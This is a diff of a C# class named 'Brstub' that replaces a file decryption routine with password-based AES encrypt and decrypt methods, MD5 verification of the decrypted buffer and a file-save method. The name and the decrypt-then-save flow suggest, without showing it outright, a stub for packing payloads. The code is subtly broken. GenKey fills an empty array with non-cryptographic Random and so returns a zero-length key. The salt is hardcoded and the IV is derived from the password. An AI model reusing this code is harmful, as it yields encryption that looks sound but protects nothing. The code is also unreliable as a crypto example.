@@ -9,15 +9,7 @@ using Microsoft.Win32;
 /// </summary>
 public class Brstub
 {
-    //variables
-
-    byte[] decrypted;
-
-
-    /// <summary>
-    /// Get decrypted value
-    /// </summary>
-    public byte[] Decrypted { get => decrypted; set => decrypted = value; }
+   
 
     /// <summary>
     /// Type of register key.
@@ -84,6 +76,7 @@ public class Brstub
         return sBuilder.ToString();
     }
 
+    /*
     /// <summary>
     /// Encrypt file with random key and IV.
     /// </summary>
@@ -216,7 +209,7 @@ public class Brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns>Byte array of decrypted file.</returns>
-   /* public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
+    public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
     {
 
         
@@ -245,24 +238,110 @@ public class Brstub
         }
 
         return decrypted;
-    }*/
-    public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
-    {
-        using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
-        {
-            var decryptor = aes.CreateDecryptor(key, IV);
-            decrypted = decryptor.TransformFinalBlock(encFile, 0, encFile.Length);
-        }
-        return decrypted;
     }
+   
+    */
+    /// <summary>
+    /// Generate key.
+    /// </summary>
+    /// <returns></returns>
+    public byte[] GenKey()
+    {
+        byte[] key= { };
+
+        Random rnd = new Random();
+        rnd.NextBytes(key);
+
+        return key;
+    }
+
+    /// <summary>
+    /// Encrypting data.
+    /// </summary>
+    /// <param name="bytesToBeEncrypted">Data to encrypt as byte array.</param>
+    /// <param name="passwordBytes">Key as byte array.</param>
+    /// <returns>Encrypted data as byte array.</returns>
+    public byte[] Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+    {
+        byte[] encryptedBytes = null;
+
+        // Set your salt here, change it to meet your flavor:
+        // The salt bytes must be at least 8 bytes.
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+        using (MemoryStream ms = new MemoryStream())
+        {
+            using (RijndaelManaged AES = new RijndaelManaged())
+            {
+                AES.KeySize = 256;
+                AES.BlockSize = 128;
+
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                AES.Key = key.GetBytes(AES.KeySize / 8);
+                AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                AES.Mode = CipherMode.CBC;
+
+                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                    cs.Close();
+                }
+                encryptedBytes = ms.ToArray();
+            }
+        }
+
+        return encryptedBytes;
+    }
+
+    /// <summary>
+    /// Decrypting data.
+    /// </summary>
+    /// <param name="bytesToBeDecrypted">Data to decrypt as byte array.</param>
+    /// <param name="passwordBytes">Key as byte array.</param>
+    /// <returns>Decrypted data as byte array</returns>
+    public byte[] Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
+    {
+        byte[] decryptedBytes = null;
+
+        // Set your salt here, change it to meet your flavor:
+        // The salt bytes must be at least 8 bytes.
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+        using (MemoryStream ms = new MemoryStream())
+        {
+            using (RijndaelManaged AES = new RijndaelManaged())
+            {
+                AES.KeySize = 256;
+                AES.BlockSize = 128;
+
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                AES.Key = key.GetBytes(AES.KeySize / 8);
+                AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                AES.Mode = CipherMode.CBC;
+
+                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
+                {
+                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                    cs.Close();
+                }
+                decryptedBytes = ms.ToArray();
+            }
+        }
+
+        return decryptedBytes;
+    }
+
 
 
     /// <summary>
     /// Check's decrypted file is correct.
     /// </summary>
+    /// <param name="decrypted">This is decrypted file table.</param>
     /// <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
     /// <returns>Return true if hashes are  same, false if hashes are different.</returns>
-    public bool CheckMD5(string hashMD5)
+    public bool CheckMD5(byte[] decrypted ,string hashMD5)
     {
         using ( MD5 md5Hash = MD5.Create())
         {
@@ -284,7 +363,7 @@ public class Brstub
     /// <param name="path">Path to save file</param>
     /// <returns>Return true if file's exist ,false if isn't exist.</returns>
     
-    public bool SaveFile(string path )
+    public bool SaveFile(string path ,byte[] decrypted)
     {
         File.WriteAllBytes(path, decrypted);
 
